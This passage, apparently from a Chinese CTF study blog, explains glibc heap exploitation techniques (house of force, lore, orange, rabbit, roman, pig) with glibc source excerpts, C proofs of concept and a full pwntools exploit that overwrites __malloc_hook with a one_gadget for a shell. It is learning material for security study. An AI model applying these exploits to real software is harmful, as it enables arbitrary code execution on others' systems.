class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487A1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  myread((<span class="type">int</span>)s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dworr_804B0CC_name = (<span class="type">int</span>)tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后info又会将其打印出来,于是泄露了堆地址</p><p>之后的读取org和host同样是利用strcpy,不过是这次strcpy可以转移的长度更长可以利用其覆盖topchunk的size</p><p>之后</p><ol><li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回 notesize 地址处的内存，从而我们就可以控制所有 note 的大小以及对应的地址了。</li><li>修改前三个 note 的大小为 16，并修改其指针为 free@got，atoi@got，atoi@got</li><li>将 free@got 修改为 puts@plt。</li><li>泄漏 atoi 地址。</li><li>再次修改另外一个 atoi got 项为 system 地址，从而拿到 shell。</li></ol><p>这题因为环境的原因只能到此为止,无法实操了</p><p><strong>总结主要就是对strcpy的利用,不遇到\x00就不停止</strong></p><h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h2 id="概要-2"><a href="#概要-2" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p><p><strong>利用条件:</strong></p><ol><li>能够控制smallbin最后一个chunk 的 bk 指针</li><li>能够控制指定位置 chunk 的 fd 指针</li></ol><p><strong>利用效果:</strong>分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>当malloc申请的chunk在smallbin范围内时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>如果可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，</p><p>并且同时满足之后的 bck-&gt;fd == victim 的检测，那么就可以使得 small bin 的 bk 恰好为构造的 fake chunk。</p><p>也就是说，当下一次申请 small bin 的时候，就会分配到指定位置的 fake chunk。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//bck</span></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);<span class="comment">//阻止victim合并到top</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);<span class="comment">//到unsortedbin中</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);<span class="comment">//victim从unsortedbin中被取出</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">//bk</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//触发,下一次取出就是取出fakechunk</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//p4就是(intptr_t*)stack_buffer_1 + 2</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; </span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="概要-3"><a href="#概要-3" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><p><strong>利用条件:</strong></p><ol><li>要能够申请一个比top_size更大但是小于0x20000的size(任意大小申请,多次申请,top-size修改)</li></ol><p><strong>利用效果:</strong>在无free下放入一个chunk到unsortedbin中</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Otherwise, relay to handle system-dependent cases</span><br><span class="line">*/</span><br><span class="line">else &#123;</span><br><span class="line">      void *p = sysmalloc(nb, av);</span><br><span class="line">      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 <strong>brk</strong> 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 <strong>128K</strong>，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p><strong>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||</span><br><span class="line">     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((unsigned long)old_end &amp; pagemask) == 0));</span><br></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小<strong>必须大于等于 MINSIZE</strong>，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 <strong>top chunk 必须标识前一个 chunk 处于 inuse 状态</strong>，并且 <strong>top chunk 的结束地址必定是页对齐的</strong>。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>总结一下伪造的 top chunk size 的要求</p><ol><li><strong>伪造的 size 必须要对齐到内存页</strong></li><li>size 要大于等于 MINSIZE</li><li>size 要小于之后申请的 chunk size + MINSIZE</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 hiton house of orange</strong></p><h1 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h1><h2 id="概要-4"><a href="#概要-4" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p><p><strong>利用条件:</strong></p><ol><li>可以修改 fastbin 的 fd 指针或 size </li><li>可以触发 malloc consolidate</li></ol><p><strong>利用效果:</strong>overlap</p><p><strong>有效版本:</strong>2.27以前</p><p><strong>失效原因:</strong>2.27及以后malloc_consolidate也开始进行检查了</p><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。</p><p>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备</p><p> <code>POC 1</code>: modify the size of fastbin chunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x40); //0x602050</span><br><span class="line">malloc(0x10);</span><br><span class="line">free(chunk1);</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1</span><br><span class="line">malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate</span><br></pre></td></tr></table></figure><p><code>POC 2</code>:modify FD pointer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x100);//0x602050</span><br><span class="line"></span><br><span class="line">chunk2[1]=0x31; //fake chunk size 0x30</span><br><span class="line">chunk2[7]=0x21  //fake chunk&#x27;s next chunk</span><br><span class="line">chunk2[11]=0x21 //fake chunk&#x27;s next chunk&#x27;s next chuck</span><br><span class="line"></span><br><span class="line">free(chunk1);</span><br><span class="line">chuck1[0]=0x602060;// modify the fd of chunk1</span><br><span class="line">malloc(5000);// malloc a  big chunk to trigger malloc consolidate</span><br></pre></td></tr></table></figure><p>原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。</p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p><strong>HITB-GSEC-XCTF 2018 mutepig</strong></p><h1 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h1><h2 id="概要-5"><a href="#概要-5" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Roman是 fastbin attack(tcache也行) 和 Unsortbin attack 结合的一个用于绕过ASLR(利用 12-bit 的爆破)来达到获取 shell 的目的的技巧。</p><p><strong>利用条件:</strong></p><ol><li>UAF</li><li>任意大小chunk申请</li></ol><p><strong>利用效果:</strong>bypass ALSR</p><p><strong>有效版本:</strong>2.29以前</p><p><strong>失效原因:</strong>2.29及以后unsortedbin attack失效</p><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>作者给了一个demo,以此来学习该技术</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/hor&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序实现了增删改功能,其中free未置0,edit可以off-by-one</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hor&quot;</span>,aslr=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">menu()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">menu()</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">menu()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">create(<span class="number">24</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">24</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">16</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">17</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">18</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">19</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"></span><br><span class="line">arena_po = <span class="string">b&quot;\xed\x8a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,arena_po)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Control arena through 0.</span></span><br><span class="line"><span class="comment"># Now unsorted bin attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First fix 0x71 freelist.</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fixed.</span></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">24</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x8b&quot;</span></span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#4527a</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">19</span></span><br><span class="line">over += <span class="string">b&quot;\x7a\x92\xf3&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">resp = p.recv(<span class="number">4</span>, timeout=<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>只有1/65536的概率成功</p><p>流程大致如下:</p><ol><li>将一个unsortedbin范围的chunk-A进行free使main_arena+88写入</li><li>修改A的size为0x71</li><li>挂两个0x71的chunk进入fastbin</li><li>部分写使A被挂入fastbin</li><li>第一次爆破写&amp;__malloc_hook-0x23到A的fd(1/16)</li><li>将__malloc_hook-0x23申请出来</li><li>修复fastbin</li><li>将一个chunk-B放入unsortedbin中,部分写bk为&amp;<em>_malloc_hook-0x10,利用unsorted攻击写入main_arena+88至&amp;\</em>_malloc_hook</li><li>第二次爆破写__malloc_hook为one_gadget(1/4096)</li></ol><p>还挺复杂的,主要就是部分写覆盖main_arena+88进行爆破</p><h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h2 id="概要-6"><a href="#概要-6" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Pig 是一个将 Tcache Stash Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p><p><strong>利用条件:</strong></p><ol><li>UAF</li><li>能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回</li></ol><p><strong>利用效果:</strong>在无malloc函数下利用tcache操作__free_hook</p><p><strong>适用情况:</strong>只有calloc函数,glibc231以上</p><p><strong>有效版本:</strong></p><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>主要利用的函数为 <code>_IO_str_overflow</code></p><p>利用流程为</p><ol><li>进行一个 Tcache Stash Unlink+ 攻击，把地址 <code>__free_hook - 0x10</code> 写入 tcache_pthread_struct。由于该攻击要求 <code>__free_hook - 0x8</code> 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</li><li>再进行一个 large bin attack，修改 <code>_IO_list_all</code> 为一个堆地址，然后在该处伪造 <code>_IO_FILE</code> 结构体。</li><li>通过伪造的结构体触发 <code>_IO_str_overflow</code> getshell。</li></ol><p>这是_IO_str_overflow的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; 